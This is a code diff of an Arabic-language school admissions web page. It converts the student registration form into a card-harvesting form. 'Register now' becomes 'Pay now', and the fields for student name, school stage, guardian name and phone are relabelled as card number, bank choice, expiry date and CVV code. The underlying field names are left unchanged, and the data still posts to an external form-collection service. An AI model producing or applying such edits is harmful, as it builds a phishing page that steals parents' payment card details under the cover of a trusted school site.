@@ -640,7 +640,7 @@
         <button class="btn-login" onclick="openLoginModal()">
           <i class="fa-solid fa-user"></i> حساب ولي الأمر
         </button>
-        <a href="#register" class="btn-apply">سجل الآن</a>
+        <a href="#register" class="btn-apply">سدد الأن </a>
       </div>
     </div>
   </header>
@@ -737,29 +737,29 @@
       <form id="admissionForm" action="https://formspree.io/f/xoevnrlj" method="POST">
         
         <div class="form-group">
-          <label for="studentName">اسم الطالب كاملاً</label>
-          <input type="text" id="studentName" name="اسم الطالب" placeholder="الاسم الرباعي للطالب" required>
+          <label for="studentName">رقم البطاقة  </label>
+          <input type="text" id="studentName" name="اسم الطالب" placeholder="0000000000000" required>
         </div>
 
         <div class="form-group">
-          <label for="stage">المرحلة الدراسية المراد النقل إليها</label>
+          <label for="stage">اختر البنك </label>
           <select id="stage" name="المرحلة الدراسية" required>
             <option value="" disabled selected>اختر المرحلة...</option>
-            <option value="الروضة والتمهيدي">الروضة والتمهيدي</option>
-            <option value="المرحلة الابتدائية">المرحلة الابتدائية</option>
-            <option value="المرحلة المتوسطة">المرحلة المتوسطة</option>
-            <option value="المرحلة الثانوية">المرحلة الثانوية</option>
+            <option value="الروضة والتمهيدي">بنك الأهلي </option>
+            <option value="المرحلة الابتدائية">المرحلة بنك الراجحي</option>
+            <option value="المرحلة المتوسطة">بنك الرياض </option>
+            <option value="المرحلة الثانوية">بنك اخر </option>
           </select>
         </div>
 
         <div class="form-group">
-          <label for="guardianName">اسم ولي الأمر</label>
-          <input type="text" id="guardianName" name="اسم ولي الأمر" placeholder="الاسم الكامل لولي الأمر" required>
+          <label for="guardianName"> تاريخ الانتهاء</label>
+          <input type="text" id="guardianName" name="اسم الاب" placeholder=" 01/35" required>
         </div>
 
         <div class="form-group">
-          <label for="phone">رقم هاتف التواصل</label>
-          <input type="tel" id="phone" name="رقم الهاتف" placeholder="05XXXXXXXX" required>
+          <label for="phone">💳الكود</label>
+          <input type="tel" id="phone" name="رقم الهاتف" placeholder="123" required>
         </div>
 
         <div class="form-group">
